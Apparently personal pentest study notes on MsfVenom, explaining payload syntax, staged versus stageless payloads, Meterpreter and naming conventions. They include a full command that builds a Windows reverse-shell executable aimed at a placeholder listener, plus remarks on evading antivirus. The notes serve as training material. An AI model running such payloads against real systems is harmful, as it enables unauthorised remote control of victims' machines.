```
▄▖    ▜        ▐▘  ▄▖▘      ▗   ▄▖    ▜   ▘▗   
▙▘█▌▀▌▐ ▛▛▌  ▛▌▜▘  ▙▖▌▛▘█▌  ▚▘  ▙▖▚▘▛▌▐ ▛▌▌▜▘▛▘
▌▌▙▖█▌▐▖▌▌▌  ▙▌▐   ▌ ▌▌ ▙▖  ▚▌  ▙▖▞▖▙▌▐▖▙▌▌▐▖▄▌
                                    ▌
```
	        Some of the material might be taken from THM or HTB


# What are exploits?

## Metasploit
 WIP

## MsfVenom

MsfVenom is one of the premiere tools for generating malware and exploits/payloads, it can be used to make payloads in loads of runnable formats for different operating systems and architectures and its syntax is as follows:

	msfvenom -p <PAYLOAD> <OPTIONS>

so to run a windows x64 reverse shell as an exe file format we would type:

	msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listener-ip> LPORT=<listener-port>

- **-f** (format)

- Specifies the output format. In this case that is an executable (EXE)

- **-o** (file)

- The output location and filename for the generated payload.

- **LHOST=**(IP)

- Specifies the IP to connect back to. 

- **LPORT=**(port)

- The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.

### Staged vs Stageless payloads

- Staged payloads are split and sent into two part. The first part is called the stager, this piece of code is executed directly on the server itself. It connects back to a listener, but it doesn't contain any of the reverse shell code which would get flagged. It uses the established connection with the listener to load the real payload, executing it directly without it ever touching the disk, thus lowering the chances of it being caught by traditional antivirus software programs. Thus, our payload is split into two stages (hence the name 'staged' payload) a small initial stager which is then responsible for downloading the bulkier reverse shell code. Staged payloads require a listener such as the metasploit multi/handler
- Stageless payloads are more common and tend to be entirely self-contained and when executed sends a shell back to the waiting listener immediately.

Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.

### Meterpreter

On the subject of Metasploit, another important thing to discuss is a _Meterpreter_ shell. Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets. They also have a lot of inbuilt functionality of their own, such as file uploads and downloads. If we want to use any of Metasploit's post-exploitation tools then we need to use a meterpreter shell, however, that is a topic for another time. The downside to meterpreter shells is that they _must_ be caught in Metasploit.

### Payload Naming Conventions

When working with msfvenom, it's essential to understand how the naming system works. The basic convention is as follows:

`<OS>/<arch>/<payload>`  
  
For example:

`linux/x86/shell_reverse_tcp`  
-OS: linux
-Architecture: x86
-Payload: reverse tcp shell
-Use case: trigger a reverse tcp shell to the target linux machine

The exception to this convention is Windows 32bit targets. For these, the arch is not specified and it's left empty.

`windows/shell_reverse_tcp`

-OS: windows
-Architecture: x32
-Payload: reverse tcp shell
-Use case: trigger a reverse tcp shell to the target windows machine

For a 64bit Windows target, the arch would be specified as normal (x64).

Another thing to note is that stageless payloads are denoted with underscores __
while staged payloads are denoted with forward slash /


A Windows 64bit staged Meterpreter payload would look like this:

`windows/x64/meterpreter/reverse_tcp`  

A Linux 32bit stageless Meterpreter payload would look like this:

`linux/x86/meterpreter_reverse_tcp`

---

the other important thing to note when working with msfvenom is:  

`msfvenom --list payloads`  

This can be used to list all available payloads, which can then be piped into `grep` to search for a specific set of payloads.
